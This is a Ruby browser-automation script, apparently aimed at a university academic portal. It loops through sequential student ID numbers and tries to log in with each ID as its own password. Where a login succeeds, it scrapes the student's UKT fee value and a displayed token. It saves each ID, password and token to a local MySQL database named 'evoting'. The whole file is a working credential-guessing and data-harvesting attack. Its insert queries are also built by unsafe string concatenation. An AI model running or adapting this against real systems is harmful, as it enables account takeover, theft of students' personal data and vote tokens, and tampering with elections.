require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
@@baseUrl = "http://192.168.0.55/"
@@browser = Watir::Browser.new :chrome


@@NIM = "e1e1"
@@tahun = [ "16" ]
@@start = 15
@@_end = 99

$i = 15

begin
    @@no = $i.to_s.rjust(3, "0")
    #puts("Inside the loop i = "+"#{@@nim}" +"#{@@tahun[0]}"+"#{@@no}" )

    nim = "#{@@NIM}" +"#{@@tahun[0]}"+"#{@@no}"
    #nim = "e1e116017"
    pass = nim
    puts( nim )

    @@browser.goto @@baseUrl + "/index.php?exec=login"
    @@browser.text_field(:name => "NIP").set nim
    @@browser.text_field(:name => "password").set pass
    @@browser.input(:type => "submit" ).click 

    $i +=1;

    sleep(1)    
    # if  @@browser.url != "http://192.168.0.55//ademik.php"
    if  @@browser.tables( :class => "box" ).length > 1
        begin
            text = @@browser.tables( :class => "box" )[1].tbody.trs[1].tds[1].text
            text = text.split(/\n/)
            if @@browser.h2( :style => "color:red;font-size:25px" ).exists?
                token = @@browser.h2( :style => "color:red;font-size:25px" ).text
                puts( token )
                puts( text.inspect )
                puts( text[5] )
                ukt = text[5]
                tokenfix = token[7, token.length-1]
                puts(tokenfix)
                query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`, `token` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ", " + "'#{tokenfix}'" + ")"
                puts( query )
                
                client.query(query)
            else
                #puts( token )
                #puts( text.inspect )
                puts( text[5] )
                ukt = text[5]
                #tokenfix = ""
                #puts(tokenfix)
                #query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`, `token` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ", " + "'#{tokenfix}'" + ")"
                query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ")"
                puts( query )
                    
                client.query(query)
            end    
        rescue
            ap "failed to save data"
            #token = @@browser.h2( :style => "color:red;font-size:25px" ).text
        end
    end
    sleep(2)

end until $i > @@_end


sleep(500)
